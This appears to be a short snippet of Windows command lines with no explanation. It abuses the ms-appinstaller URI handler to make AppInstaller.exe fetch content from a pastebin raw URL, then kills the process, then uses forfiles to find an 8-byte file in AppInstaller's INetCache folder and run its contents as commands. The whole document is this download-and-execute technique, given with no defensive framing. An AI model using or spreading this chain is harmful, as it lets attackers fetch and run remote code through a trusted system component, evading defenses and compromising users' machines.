`start ms-appinstaller://?source=<url> && timeout 1 && taskkill /F /IM AppInstaller.exe > NUL`

> start ms-appinstaller://?source=`https://pastebin.com/raw/tdyShwLw` && timeout 1 && taskkill /F /IM AppInstaller.exe > NUL

`forfiles /P "C:\Users\v\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache" /S /M * /C " cmd /c if @fsize==8 FOR /F \"tokens=*\" %g IN ('type @path') do (%g );" >NUL`
